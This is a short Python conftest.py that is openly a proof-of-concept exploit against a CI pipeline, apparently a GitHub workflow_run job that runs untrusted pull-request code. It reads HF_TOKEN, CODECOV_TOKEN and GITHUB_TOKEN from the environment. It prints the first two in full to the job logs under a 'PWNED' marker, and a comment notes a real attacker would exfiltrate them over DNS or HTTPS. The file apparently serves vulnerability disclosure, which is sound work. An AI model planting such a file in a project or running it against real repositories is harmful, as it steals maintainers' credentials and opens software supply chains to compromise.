import os
import sys

# Marker so the exfil is unmistakable in logs
MARKER = "PWNED_D_a1b2c3d4"

hf = os.environ.get("HF_TOKEN", "<no-HF_TOKEN>")
cc = os.environ.get("CODECOV_TOKEN", "<no-CODECOV_TOKEN>")
gt = os.environ.get("GITHUB_TOKEN", "<no-GITHUB_TOKEN>")

# Print to stdout so it lands in the run logs (the "observable side channel"
# for this PoC). A real attacker would exfil via DNS or HTTPS, but log dump
# is sufficient evidence the secret was readable from attacker-controlled
# code executed inside the privileged workflow_run job.
print(f"[{MARKER}] conftest.py executed under pytest", flush=True)
print(f"[{MARKER}] HF_TOKEN={hf}", flush=True)
print(f"[{MARKER}] CODECOV_TOKEN={cc}", flush=True)
print(f"[{MARKER}] GITHUB_TOKEN_present={'yes' if gt and gt != '<no-GITHUB_TOKEN>' else 'no'}", flush=True)
sys.stdout.flush()
